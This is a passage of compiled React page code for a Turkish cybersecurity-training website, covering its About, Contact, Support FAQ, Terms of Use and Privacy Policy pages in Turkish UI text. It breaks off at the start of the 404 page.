var SiberKampusPages = (() => {
  // app-pages.jsx
  var { useState, useRef, useEffect } = React;
  var Header = window.SKHeader;
  var Footer = window.SKFooter;
  var AppHeader = window.SKAppHeader;
  var ME = window.SKME;
  var SectionLabel = window.SKSectionLabel;
  var useUser = window.SKuseUser;
  var PAGES = window.__SK_PAGES = window.__SK_PAGES || {};
  var Label = ({ children }) => /* @__PURE__ */ React.createElement("span", { className: "font-mono text-[12px] font-medium tracking-[.18em] uppercase text-[#00ff88] inline-flex items-center gap-2.5 mb-4" }, /* @__PURE__ */ React.createElement("span", { className: "text-[#5c8a74] font-bold" }, "//"), " ", children);
  var AboutPage = ({ navigate }) => {
    const [totalUsers, setTotalUsers] = useState(12400);
    useEffect(() => {
      fetch("/api/stats").then((res) => res.json()).then((data) => {
        if (data && data.totalUsers) {
          setTotalUsers(data.totalUsers);
        }
      }).catch(() => {
      });
    }, []);
    const values = [
      { icon: "\u26A1", t: "Pratik \xD6nce Gelir", d: "Teoriyi de\u011Fil, parmaklar\u0131n\u0131n klavyede ger\xE7ek sistemi ele ge\xE7irdi\u011Fi an\u0131 \xF6nemsiyoruz." },
      { icon: "\u{1F6E1}\uFE0F", t: "Etik & Sorumluluk", d: "Sald\u0131r\u0131y\u0131 \xF6\u011Fretiyoruz ki savunmay\u0131 kurabilesin. Her \u015Fey izole, g\xFCvenli ve yasal s\u0131n\u0131rlar i\xE7inde." },
      { icon: "\u{1F30D}", t: "Herkese A\xE7\u0131k", d: "Pahal\u0131 kurslar ya da g\xFC\xE7l\xFC donan\u0131m gerekmez. Taray\u0131c\u0131n ve merak\u0131n yeterli." },
      { icon: "\u{1F91D}", t: "Topluluk G\xFCc\xFC", d: "Binlerce \xF6\u011Frenci, ment\xF6r ve uzman ayn\u0131 \xE7at\u0131 alt\u0131nda birlikte \xF6\u011Freniyor." }
    ];
    const team = [
      { av: "YY", name: "Yusuf \u0130slam Yetkin", role: "Kurucu", tag: "Software Arch." },
      { av: "ZY", name: "Zeynep Y\u0131ld\u0131z", role: "E\u011Fitim Direkt\xF6r\xFC", tag: "CISSP" },
      { av: "E\xC7", name: "Emre \xC7elik", role: "Lab Mimar\u0131", tag: "Red Team" },
      { av: "MT", name: "Melis Ta\u015F", role: "Topluluk Lideri", tag: "CTF Player" }
    ];
    return /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement(Header, { navigate }), /* @__PURE__ */ React.createElement("section", { className: "relative overflow-hidden border-b border-[#0c2719]" }, /* @__PURE__ */ React.createElement("div", { className: "absolute top-[-20%] left-1/2 -translate-x-1/2 w-[820px] h-[440px] z-0 pointer-events-none", style: { background: "radial-gradient(ellipse at center,rgba(0,255,136,.13),transparent 62%)" } }), /* @__PURE__ */ React.createElement("div", { className: "max-w-[860px] mx-auto px-8 relative z-[2] text-center py-24" }, /* @__PURE__ */ React.createElement(Label, null, "Hakk\u0131m\u0131zda"), /* @__PURE__ */ React.createElement("h1", { className: "text-[clamp(34px,5vw,58px)] text-[#eafff5] mb-5" }, "G\xFCvenlik Uzmanlar\u0131n\u0131 ", /* @__PURE__ */ React.createElement("span", { className: "text-[#00ff88]" }, "Klavyede"), " Yeti\u015Ftiriyoruz"), /* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] text-lg leading-relaxed max-w-[640px] mx-auto" }, "Siber Kamp\xFCs Akademi, siber g\xFCvenli\u011Fi izlenecek bir ders de\u011Fil, oynanacak bir oyun haline getirmek i\xE7in kuruldu. Amac\u0131m\u0131z net: T\xFCrkiye'de yeni nesil siber g\xFCvenlik uzmanlar\u0131n\u0131, ger\xE7ek sistemleri ele ge\xE7irerek \xF6\u011Frenebilecekleri bir kamp\xFCste yeti\u015Ftirmek."))), /* @__PURE__ */ React.createElement("section", { className: "py-24 border-b border-[#0c2719]" }, /* @__PURE__ */ React.createElement("div", { className: "max-w-[1080px] mx-auto px-8 grid grid-cols-1 lg:grid-cols-2 gap-16 items-center" }, /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement(Label, null, "Hikayemiz"), /* @__PURE__ */ React.createElement("h2", { className: "text-[clamp(26px,3.5vw,38px)] text-[#eafff5] mb-5" }, "Bir Terminal, Bir Merak"), /* @__PURE__ */ React.createElement("div", { className: "space-y-4 text-[#74998a] leading-relaxed" }, /* @__PURE__ */ React.createElement("p", null, 'Siber Kamp\xFCs Akademi, "siber g\xFCvenli\u011Fe nereden ba\u015Flasam?" sorusuna tak\u0131l\u0131p kalm\u0131\u015F \xF6\u011Frencilerin hayal k\u0131r\u0131kl\u0131\u011F\u0131ndan do\u011Fdu. Da\u011F\u0131n\u0131k videolar, kurmas\u0131 saatler s\xFCren sanal makineler ve ger\xE7ek pratikten kopuk teori... Biz bunu k\u0131rmak istedik.'), /* @__PURE__ */ React.createElement("p", null, "Bug\xFCn, kurulum gerektirmeyen taray\u0131c\u0131 tabanl\u0131 laboratuvarlar\u0131m\u0131zda binlerce \xF6\u011Frenci ger\xE7ek zafiyetleri s\xF6m\xFCrerek \xF6\u011Freniyor. \u0130lk bayra\u011F\u0131n\u0131 yakalayan herkesin g\xF6z\xFCndeki o k\u0131v\u0131lc\u0131m, bizi her g\xFCn daha fazlas\u0131n\u0131 \xFCretmeye itiyor."), /* @__PURE__ */ React.createElement("p", null, "Siber Kamp\xFCs Akademi, kurucumuz ", /* @__PURE__ */ React.createElement("strong", { className: "text-[#cdeede]" }, "Yusuf \u0130slam Yetkin"), "'in vizyonuyla \u015Fekillendi \u2014 uzun y\u0131llar finans ve enterprise sistemlerde \xE7al\u0131\u015Fm\u0131\u015F, \xF6l\xE7eklenen g\xFCvenli sistemler kurmu\u015F deneyimli bir yaz\u0131l\u0131m m\xFChendisi. Sahada \xF6\u011Frendi\u011Fi bir ger\xE7e\u011Fi bu platforma ta\u015F\u0131d\u0131: g\xFCvenlik, kodu k\u0131ran\u0131 anlamadan kurulamaz."))), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-2 gap-4" }, [[totalUsers.toLocaleString("tr-TR") + "+", "Aktif \xD6\u011Frenci"], [(window.SK_ALL_ROOMS ? window.SK_ALL_ROOMS.length : 15) + "+", "Hacking Laboratuvar\u0131"], ["90+", "CTF G\xF6revi"], ["2026", "Kurulu\u015F"]].map(([n, l], i) => /* @__PURE__ */ React.createElement("div", { key: i, className: "rounded-2xl border border-[#0c2719] p-7 text-center", style: { background: "linear-gradient(165deg,#07150e,#04100a)" } }, /* @__PURE__ */ React.createElement("div", { className: "font-disp font-bold text-3xl text-[#00ff88] drop-shadow-[0_0_22px_rgba(0,255,136,.3)]" }, n), /* @__PURE__ */ React.createElement("div", { className: "text-xs text-[#74998a] mt-2 tracking-wide" }, l)))))), /* @__PURE__ */ React.createElement("section", { className: "py-24 border-b border-[#0c2719]" }, /* @__PURE__ */ React.createElement("div", { className: "max-w-[1080px] mx-auto px-8" }, /* @__PURE__ */ React.createElement("div", { className: "text-center mb-12" }, /* @__PURE__ */ React.createElement(Label, null, "De\u011Ferlerimiz"), /* @__PURE__ */ React.createElement("h2", { className: "text-[clamp(26px,3.5vw,38px)] text-[#eafff5]" }, "Neye \u0130nan\u0131yoruz?")), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-1 md:grid-cols-2 gap-4" }, values.map((v, i) => /* @__PURE__ */ React.createElement("div", { key: i, className: "flex gap-5 rounded-2xl border border-[#0c2719] p-7", style: { background: "linear-gradient(165deg,#07150e,#04100a)" } }, /* @__PURE__ */ React.createElement("span", { className: "w-12 h-12 flex-none rounded-xl grid place-items-center text-xl border border-[#103a26] bg-[rgba(0,255,136,.04)]" }, v.icon), /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("h3", { className: "text-lg text-[#eafff5] mb-2" }, v.t), /* @__PURE__ */ React.createElement("p", { className: "text-sm text-[#74998a] leading-relaxed" }, v.d))))))), /* @__PURE__ */ React.createElement("section", { className: "py-24" }, /* @__PURE__ */ React.createElement("div", { className: "max-w-[1080px] mx-auto px-8" }, /* @__PURE__ */ React.createElement("div", { className: "text-center mb-12" }, /* @__PURE__ */ React.createElement(Label, null, "Ekip"), /* @__PURE__ */ React.createElement("h2", { className: "text-[clamp(26px,3.5vw,38px)] text-[#eafff5]" }, "Kamp\xFCs\xFC Kuranlar")), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-2 lg:grid-cols-4 gap-4" }, team.map((m, i) => /* @__PURE__ */ React.createElement("div", { key: i, className: "rounded-2xl border border-[#0c2719] p-7 text-center hover:border-[#00ff88] transition-all", style: { background: "linear-gradient(165deg,#07150e,#04100a)" } }, /* @__PURE__ */ React.createElement("div", { className: "w-16 h-16 mx-auto rounded-2xl grid place-items-center text-[#5cffba] font-bold text-lg border border-[#103a26] mb-4", style: { background: "linear-gradient(135deg,#0a3a24,#052b18)" } }, m.av), /* @__PURE__ */ React.createElement("h3", { className: "text-[15px] text-[#eafff5]" }, m.name), /* @__PURE__ */ React.createElement("p", { className: "text-xs text-[#74998a] mt-1.5" }, m.role), /* @__PURE__ */ React.createElement("span", { className: "inline-block mt-3 font-mono text-[10px] text-[#00ff88] border border-[#103a26] px-2 py-1 rounded-full bg-[rgba(0,255,136,.04)]" }, m.tag)))), /* @__PURE__ */ React.createElement("div", { className: "text-center mt-14" }, /* @__PURE__ */ React.createElement("button", { onClick: () => navigate("register"), className: "font-mono text-sm font-bold text-[#021008] bg-[#00ff88] px-7 py-4 clip-btn hover:shadow-[0_0_28px_-4px_var(--glow)] transition-all" }, "Sen de Aram\u0131za Kat\u0131l \u2192")))), /* @__PURE__ */ React.createElement(Footer, { navigate }));
  };
  var ContactPage = ({ navigate }) => {
    const [sent, setSent] = useState(false);
    const channels = [
      { icon: "\u2709\uFE0F", t: "E-posta", v: "destek@siberkampus.com" },
      { icon: "\u{1F4AC}", t: "Canl\u0131 Sohbet", v: "Topluluk kanal\u0131 \xB7 7/24" },
      { icon: "\u{1F426}", t: "Sosyal Medya", v: "@siberkampus" }
    ];
    return /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement(Header, { navigate }), /* @__PURE__ */ React.createElement("section", { className: "py-20 border-b border-[#0c2719]" }, /* @__PURE__ */ React.createElement("div", { className: "max-w-[1080px] mx-auto px-8" }, /* @__PURE__ */ React.createElement(Label, null, "\u0130leti\u015Fim"), /* @__PURE__ */ React.createElement("h1", { className: "text-[clamp(32px,5vw,52px)] text-[#eafff5] my-4" }, "Bize Ula\u015F"), /* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] max-w-[600px]" }, 'Sorun, \xF6neri, i\u015F birli\u011Fi ya da sadece "selam" demek i\xE7in \u2014 kanal\u0131n hangisiyse oraday\u0131z.'))), /* @__PURE__ */ React.createElement("section", { className: "py-20" }, /* @__PURE__ */ React.createElement("div", { className: "max-w-[1080px] mx-auto px-8 grid grid-cols-1 lg:grid-cols-[1fr_1.3fr] gap-10" }, /* @__PURE__ */ React.createElement("div", { className: "space-y-4" }, channels.map((c, i) => /* @__PURE__ */ React.createElement("div", { key: i, className: "flex items-center gap-4 rounded-xl border border-[#0c2719] p-5", style: { background: "linear-gradient(165deg,#07150e,#04100a)" } }, /* @__PURE__ */ React.createElement("span", { className: "w-11 h-11 flex-none rounded-lg grid place-items-center text-lg border border-[#103a26] bg-[rgba(0,255,136,.04)]" }, c.icon), /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("div", { className: "text-xs text-[#74998a]" }, c.t), /* @__PURE__ */ React.createElement("div", { className: "text-sm text-[#eafff5] font-mono mt-0.5" }, c.v)))), /* @__PURE__ */ React.createElement("div", { className: "rounded-xl border border-[#103a26] p-5 bg-[rgba(0,255,136,.03)]" }, /* @__PURE__ */ React.createElement("p", { className: "text-sm text-[#74998a] leading-relaxed" }, /* @__PURE__ */ React.createElement("span", { className: "text-[#00ff88]" }, "\u26A1 H\u0131zl\u0131 yan\u0131t:"), " Teknik sorular i\xE7in ", /* @__PURE__ */ React.createElement("button", { onClick: () => navigate("support"), className: "text-[#00ff88] hover:text-[#5cffba] underline" }, "Destek"), " sayfas\u0131ndaki SSS'e g\xF6z at \u2014 \xE7o\u011Fu cevap orada."))), /* @__PURE__ */ React.createElement("div", { className: "rounded-2xl border border-[#0c2719] p-8", style: { background: "linear-gradient(165deg,#07150e,#04100a)" } }, sent ? /* @__PURE__ */ React.createElement("div", { className: "text-center py-12" }, /* @__PURE__ */ React.createElement("div", { className: "text-5xl mb-4" }, "\u2705"), /* @__PURE__ */ React.createElement("h3", { className: "text-2xl text-[#eafff5] mb-2" }, "Mesaj\u0131n iletildi!"), /* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] text-sm mb-6" }, "En k\u0131sa s\xFCrede sana d\xF6nece\u011Fiz."), /* @__PURE__ */ React.createElement("button", { onClick: () => setSent(false), className: "text-[#00ff88] hover:text-[#5cffba] text-sm" }, "Yeni mesaj g\xF6nder")) : /* @__PURE__ */ React.createElement("form", { onSubmit: (e) => {
      e.preventDefault();
      setSent(true);
    }, className: "space-y-4" }, /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-1 sm:grid-cols-2 gap-4" }, /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-sm text-[#cdeede] mb-2" }, "Ad Soyad"), /* @__PURE__ */ React.createElement("input", { required: true, className: "w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-3 text-[#cdeede] placeholder-[#3d564b] focus:border-[#00ff88] focus:outline-none font-mono text-sm", placeholder: "Ad\u0131n" })), /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-sm text-[#cdeede] mb-2" }, "E-posta"), /* @__PURE__ */ React.createElement("input", { required: true, type: "email", className: "w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-3 text-[#cdeede] placeholder-[#3d564b] focus:border-[#00ff88] focus:outline-none font-mono text-sm", placeholder: "seni@example.com" }))), /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-sm text-[#cdeede] mb-2" }, "Konu"), /* @__PURE__ */ React.createElement("input", { required: true, className: "w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-3 text-[#cdeede] placeholder-[#3d564b] focus:border-[#00ff88] focus:outline-none font-mono text-sm", placeholder: "Ne hakk\u0131nda?" })), /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-sm text-[#cdeede] mb-2" }, "Mesaj"), /* @__PURE__ */ React.createElement("textarea", { required: true, rows: "5", className: "w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-3 text-[#cdeede] placeholder-[#3d564b] focus:border-[#00ff88] focus:outline-none font-mono text-sm resize-none", placeholder: "Mesaj\u0131n\u0131 yaz\u2026" })), /* @__PURE__ */ React.createElement("button", { type: "submit", className: "w-full font-mono font-bold text-[#021008] bg-[#00ff88] py-3 rounded-lg hover:shadow-[0_0_28px_-4px_var(--glow)] transition-all" }, "G\xF6nder \u2192"))))), /* @__PURE__ */ React.createElement(Footer, { navigate }));
  };
  var SupportPage = ({ navigate }) => {
    const [open, setOpen] = useState(0);
    const faqs = [
      { q: "Laboratuvarlar\u0131 \xE7\xF6zmek i\xE7in bir \u015Fey kurmam gerekiyor mu?", a: 'Hay\u0131r. T\xFCm laboratuvarlar taray\u0131c\u0131 tabanl\u0131d\u0131r. Sanal makine, dual boot ya da yap\u0131land\u0131rma gerekmez \u2014 "Ba\u015Flat" demen yeterli.' },
      { q: "Hi\xE7 deneyimim yok, ba\u015Flayabilir miyim?", a: "Kesinlikle. Ba\u015Flang\u0131\xE7 seviyesi laboratuvarlar temel Linux ve a\u011F bilgisinden ba\u015Flar. Yol haritas\u0131 seni elinden tutarak ileri seviyeye ta\u015F\u0131r." },
      { q: "\u0130pucu almak puan\u0131m\u0131 d\xFC\u015F\xFCr\xFCr m\xFC?", a: "\u0130lk ipucu genelde \xFCcretsizdir; sonraki her ipucu g\xF6rev puan\u0131ndan k\xFC\xE7\xFCk bir d\xFC\u015F\xFC\u015F yapar. B\xF6ylece kendin \xE7\xF6zmeye te\u015Fvik edilirsin." },
      { q: "Rozet ve sertifikalar ge\xE7erli mi?", a: "Her sertifika do\u011Frulanabilir bir koda sahiptir ve CV ya da LinkedIn profiline eklenebilir. Tamamlad\u0131\u011F\u0131n yollar\u0131 i\u015Fverenlere kan\u0131tlars\u0131n." },
      { q: "\xDCcretsiz mi, \xFCcretli mi?", a: "\xC7ok say\u0131da laboratuvar \xFCcretsizdir. \u0130leri seviye i\xE7erikler ve tak\u0131m \xF6zellikleri i\xE7in planlar\u0131m\u0131z mevcuttur." },
      { q: "Bir laboratuvar bozulursa ne yapar\u0131m?", a: "Laboratuvar\u0131 s\u0131f\u0131rlayabilir ya da Destek \xFCzerinden talep a\xE7abilirsin. \u0130zole ortamlar oldu\u011Fu i\xE7in s\u0131f\u0131rlama saniyeler s\xFCrer." }
    ];
    const cats = [
      { icon: "\u{1F680}", t: "Ba\u015Flang\u0131\xE7 Rehberi", d: "\u0130lk laboratuvar\u0131n\u0131 \xE7\xF6zme ad\u0131mlar\u0131" },
      { icon: "\u{1F9E9}", t: "G\xF6rev & CTF", d: "Bayrak format\u0131, ipu\xE7lar\u0131, puanlama" },
      { icon: "\u{1F464}", t: "Hesap & Profil", d: "\u015Eifre, ayarlar, rozetler" },
      { icon: "\u{1F4B3}", t: "Plan & \xD6deme", d: "Abonelik ve faturaland\u0131rma" }
    ];
    return /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement(Header, { navigate }), /* @__PURE__ */ React.createElement("section", { className: "py-20 border-b border-[#0c2719]" }, /* @__PURE__ */ React.createElement("div", { className: "max-w-[900px] mx-auto px-8 text-center" }, /* @__PURE__ */ React.createElement(Label, null, "Destek Merkezi"), /* @__PURE__ */ React.createElement("h1", { className: "text-[clamp(32px,5vw,52px)] text-[#eafff5] my-4" }, "Nas\u0131l yard\u0131mc\u0131 olabiliriz?"), /* @__PURE__ */ React.createElement("div", { className: "relative max-w-[520px] mx-auto mt-8" }, /* @__PURE__ */ React.createElement("input", { placeholder: "Bir \u015Fey ara\u2026 (\xF6rn: ipucu, sertifika)", className: "w-full bg-[#07150e] border border-[#103a26] rounded-lg pl-4 pr-10 py-3.5 text-[#cdeede] placeholder-[#3d564b] focus:border-[#00ff88] focus:outline-none font-mono text-sm" }), /* @__PURE__ */ React.createElement("span", { className: "absolute right-4 top-1/2 -translate-y-1/2 text-[#5c8a74]" }, "\u2315")))), /* @__PURE__ */ React.createElement("section", { className: "py-16 border-b border-[#0c2719]" }, /* @__PURE__ */ React.createElement("div", { className: "max-w-[1080px] mx-auto px-8 grid grid-cols-2 lg:grid-cols-4 gap-4" }, cats.map((c, i) => /* @__PURE__ */ React.createElement("div", { key: i, className: "rounded-xl border border-[#0c2719] p-6 hover:border-[#00ff88] transition-all cursor-pointer", style: { background: "linear-gradient(165deg,#07150e,#04100a)" } }, /* @__PURE__ */ React.createElement("span", { className: "w-11 h-11 rounded-lg grid place-items-center text-lg border border-[#103a26] bg-[rgba(0,255,136,.04)] mb-4 inline-flex" }, c.icon), /* @__PURE__ */ React.createElement("h3", { className: "text-[15px] text-[#eafff5] mb-1.5" }, c.t), /* @__PURE__ */ React.createElement("p", { className: "text-xs text-[#74998a]" }, c.d))))), /* @__PURE__ */ React.createElement("section", { className: "py-20" }, /* @__PURE__ */ React.createElement("div", { className: "max-w-[760px] mx-auto px-8" }, /* @__PURE__ */ React.createElement("h2", { className: "text-2xl text-[#eafff5] mb-8 text-center" }, "S\u0131k Sorulan Sorular"), /* @__PURE__ */ React.createElement("div", { className: "space-y-3" }, faqs.map((f, i) => /* @__PURE__ */ React.createElement("div", { key: i, className: "rounded-xl border border-[#0c2719] overflow-hidden", style: { background: "linear-gradient(165deg,#07150e,#04100a)" } }, /* @__PURE__ */ React.createElement("button", { onClick: () => setOpen(open === i ? -1 : i), className: "w-full flex items-center justify-between gap-4 px-6 py-4 text-left" }, /* @__PURE__ */ React.createElement("span", { className: "text-[15px] text-[#eafff5]" }, f.q), /* @__PURE__ */ React.createElement("span", { className: "text-[#00ff88] flex-none transition-transform " + (open === i ? "rotate-45" : "") }, "+")), open === i && /* @__PURE__ */ React.createElement("div", { className: "px-6 pb-5 text-sm text-[#74998a] leading-relaxed" }, f.a)))), /* @__PURE__ */ React.createElement("div", { className: "mt-12 rounded-2xl border border-[#103a26] p-8 text-center", style: { background: "linear-gradient(90deg,#07150e,#04100a)" } }, /* @__PURE__ */ React.createElement("h3", { className: "text-xl text-[#eafff5] mb-2" }, "Cevab\u0131n\u0131 bulamad\u0131n m\u0131?"), /* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] text-sm mb-6" }, "Destek ekibimiz sana yard\u0131mc\u0131 olmak i\xE7in haz\u0131r."), /* @__PURE__ */ React.createElement("button", { onClick: () => navigate("contact"), className: "font-mono text-sm font-bold text-[#021008] bg-[#00ff88] px-7 py-3 clip-btn hover:shadow-[0_0_28px_-4px_var(--glow)] transition-all" }, "Talep Olu\u015Ftur \u2192")))), /* @__PURE__ */ React.createElement(Footer, { navigate }));
  };
  var LegalLayout = ({ navigate, kicker, title, updated, sections }) => /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement(Header, { navigate }), /* @__PURE__ */ React.createElement("section", { className: "py-16 border-b border-[#0c2719]" }, /* @__PURE__ */ React.createElement("div", { className: "max-w-[800px] mx-auto px-8" }, /* @__PURE__ */ React.createElement(Label, null, kicker), /* @__PURE__ */ React.createElement("h1", { className: "text-[clamp(30px,4.5vw,46px)] text-[#eafff5] my-3" }, title), /* @__PURE__ */ React.createElement("p", { className: "text-xs text-[#5c8a74] font-mono" }, "Son g\xFCncelleme: ", updated))), /* @__PURE__ */ React.createElement("section", { className: "py-16" }, /* @__PURE__ */ React.createElement("div", { className: "max-w-[800px] mx-auto px-8 grid grid-cols-1 lg:grid-cols-[200px_1fr] gap-10" }, /* @__PURE__ */ React.createElement("nav", { className: "hidden lg:block sticky top-24 self-start space-y-2" }, sections.map((s, i) => /* @__PURE__ */ React.createElement("a", { key: i, href: "#sec-" + i, className: "block text-xs text-[#74998a] hover:text-[#00ff88] transition-colors py-1 leading-relaxed" }, i + 1, ". ", s.h))), /* @__PURE__ */ React.createElement("div", { className: "space-y-10" }, sections.map((s, i) => /* @__PURE__ */ React.createElement("div", { key: i, id: "sec-" + i }, /* @__PURE__ */ React.createElement("h2", { className: "text-xl text-[#eafff5] mb-3 flex items-center gap-3" }, /* @__PURE__ */ React.createElement("span", { className: "font-mono text-sm text-[#00ff88]" }, String(i + 1).padStart(2, "0")), s.h), /* @__PURE__ */ React.createElement("div", { className: "text-sm text-[#74998a] leading-relaxed space-y-3" }, s.p.map((para, j) => /* @__PURE__ */ React.createElement("p", { key: j }, para))))), /* @__PURE__ */ React.createElement("div", { className: "rounded-xl border border-[#103a26] p-6 bg-[rgba(0,255,136,.03)] text-sm text-[#74998a]" }, "Sorun mu var? ", /* @__PURE__ */ React.createElement("button", { onClick: () => navigate("contact"), className: "text-[#00ff88] hover:text-[#5cffba] underline" }, "\u0130leti\u015Fim"), " \xFCzerinden bize ula\u015Fabilirsin.")))), /* @__PURE__ */ React.createElement(Footer, { navigate }));
  var TermsPage = ({ navigate }) => /* @__PURE__ */ React.createElement(LegalLayout, { navigate, kicker: "Yasal", title: "Kullan\u0131m \u015Eartlar\u0131", updated: "5 Haziran 2026", sections: [
    { h: "Hizmetin Tan\u0131m\u0131", p: ["Siber Kamp\xFCs Akademi, e\u011Fitim ama\xE7l\u0131 siber g\xFCvenlik laboratuvarlar\u0131 ve CTF g\xF6revleri sunan bir \xF6\u011Frenme platformudur. T\xFCm i\xE7erik yaln\u0131zca yasal, etik \xF6\u011Frenme amac\u0131yla sa\u011Flan\u0131r."] },
    { h: "Hesap Sorumlulu\u011Fu", p: ["Hesab\u0131n\u0131z\u0131n g\xFCvenli\u011Finden ve hesab\u0131n\u0131z alt\u0131nda ger\xE7ekle\u015Ftirilen t\xFCm etkinliklerden siz sorumlusunuz. \u015Eifrenizi gizli tutmay\u0131 ve \u015F\xFCpheli bir durumda bizi bilgilendirmeyi kabul edersiniz."] },
    { h: "Kabul Edilebilir Kullan\u0131m", p: ["Platformda \xF6\u011Frendi\u011Finiz teknikleri yaln\u0131zca size ait ya da a\xE7\u0131k\xE7a izin verilmi\u015F sistemlerde kullanabilirsiniz. \u0130zinsiz sistemlere y\xF6nelik sald\u0131r\u0131lar yasa d\u0131\u015F\u0131d\u0131r ve kesinlikle yasakt\u0131r.", "Laboratuvar ortamlar\u0131n\u0131 platform d\u0131\u015F\u0131na ta\u015F\u0131maya, di\u011Fer kullan\u0131c\u0131lara zarar vermeye ya da altyap\u0131m\u0131z\u0131 k\xF6t\xFCye kullanmaya \xE7al\u0131\u015Fmak hesab\u0131n\u0131z\u0131n ask\u0131ya al\u0131nmas\u0131na yol a\xE7ar."] },
    { h: "Fikri M\xFClkiyet", p: ["Laboratuvarlar, g\xF6revler, i\xE7erikler ve marka unsurlar\u0131 Siber Kamp\xFCs Akademi'ye aittir. Yaz\u0131l\u0131 izin olmadan \xE7o\u011Falt\u0131lamaz ya da yeniden da\u011F\u0131t\u0131lamaz."] },
    { h: "Sorumlulu\u011Fun S\u0131n\u0131r\u0131", p: ['Hizmet "oldu\u011Fu gibi" sunulur. Platformun kesintisiz ya da hatas\u0131z olaca\u011F\u0131n\u0131 garanti etmeyiz. \xD6\u011Frenilen bilgilerin k\xF6t\xFCye kullan\u0131m\u0131ndan do\u011Fan sorumluluk tamamen kullan\u0131c\u0131ya aittir.'] },
    { h: "De\u011Fi\u015Fiklikler", p: ["Bu \u015Fartlar\u0131 zaman zaman g\xFCncelleyebiliriz. \xD6nemli de\u011Fi\u015Fiklikler platform \xFCzerinden duyurulur. Hizmeti kullanmaya devam etmeniz g\xFCncel \u015Fartlar\u0131 kabul etti\u011Finiz anlam\u0131na gelir."] }
  ] });
  var PrivacyPage = ({ navigate }) => /* @__PURE__ */ React.createElement(LegalLayout, { navigate, kicker: "Yasal", title: "Gizlilik Politikas\u0131", updated: "5 Haziran 2026", sections: [
    { h: "Toplad\u0131\u011F\u0131m\u0131z Veriler", p: ["Hesap olu\u015Ftururken ad, e-posta ve \u015Fifre gibi temel bilgileri topluyoruz. Platform kullan\u0131m\u0131n\u0131z s\u0131ras\u0131nda \xE7\xF6zd\xFC\u011F\xFCn\xFCz g\xF6revler, puanlar ve ilerleme verileriniz kaydedilir."] },
    { h: "Verileri Nas\u0131l Kullan\u0131r\u0131z", p: ["Verileriniz; ilerlemenizi takip etmek, liderlik tablosunu olu\u015Fturmak, sertifikalar\u0131n\u0131z\u0131 do\u011Frulamak ve deneyiminizi iyile\u015Ftirmek i\xE7in kullan\u0131l\u0131r. Pazarlama ama\xE7l\u0131 kullan\u0131m yaln\u0131zca a\xE7\u0131k onay\u0131n\u0131zla yap\u0131l\u0131r."] },
    { h: "\xC7erezler", p: ["Oturumunuzu a\xE7\u0131k tutmak ve tercihlerinizi hat\u0131rlamak i\xE7in \xE7erezler kullan\u0131r\u0131z. Taray\u0131c\u0131 ayarlar\u0131n\u0131zdan \xE7erezleri y\xF6netebilirsiniz; ancak baz\u0131 \xF6zellikler \xE7erezler olmadan \xE7al\u0131\u015Fmayabilir."] },
    { h: "Veri Payla\u015F\u0131m\u0131", p: ["Ki\u015Fisel verilerinizi \xFC\xE7\xFCnc\xFC taraflara satm\u0131yoruz. Liderlik tablosunda yaln\u0131zca kullan\u0131c\u0131 ad\u0131n\u0131z ve puan\u0131n\u0131z herkese g\xF6r\xFCn\xFCrd\xFCr. Yasal zorunluluklar d\u0131\u015F\u0131nda veri payla\u015F\u0131m\u0131 yap\u0131lmaz."] },
    { h: "G\xFCvenlik", p: ["Verileriniz \u015Fifrelenerek saklan\u0131r ve eri\u015Fim s\u0131k\u0131 \u015Fekilde s\u0131n\u0131rland\u0131r\u0131l\u0131r. Bir siber g\xFCvenlik platformu olarak kendi g\xFCvenli\u011Fimizi en \xFCst d\xFCzeyde tutmay\u0131 taahh\xFCt ederiz."] },
    { h: "Haklar\u0131n\u0131z", p: ["Verilerinize eri\u015Fme, d\xFCzeltme ya da silinmesini talep etme hakk\u0131na sahipsiniz. Bu talepler i\xE7in \u0130leti\u015Fim sayfas\u0131ndan bize ula\u015Fabilirsiniz."] }
  ] });
  var NotFoundPage = ({ navigate }) => /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement(Header, { navigate }), /* @__PURE__ */ React.createElement("section", { className: "min-h-[calc(100vh-72px)] flex items-center justify-center px-4 relative overflow-hidden" }, /* @__PURE__ */ React.createElement("div", { className: "absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[700px] h-[500px] z-0 pointer-events-none", style: { background: "radial-gradient(ellipse at center,rgba(0,255,136,.10),transparent 62%)" } }), /* @__PURE__ */ React.createElement("div", { className: "relative z-[2] w-full max-w-[560px]" }, /* @__PURE__ */ React.createElement("div", { className: "rounded-xl overflow-hidden border border-[#103a26] shadow-[0_40px_80px_-30px_#000]", style: { background: "linear-gradient(160deg,#06140d,#040d08)" } }, /* @__PURE__ */ React.createElement("div", { className: "flex items-center gap-2 px-4 py-2.5 border-b border-[#0c2719] bg-black/25" }, /* @__PURE__ */ React.createElement("span", { className: "w-2.5 h-2.5 rounded-full bg-[#ff5f57]" }), /* @__PURE__ */ React.createElement("span", { className: "w-2.5 h-2.5 rounded-full bg-[#febc2e]" }), /* @__PURE__ */ React.createElement("span", { className: "w-2.5 h-2.5 rounded-full 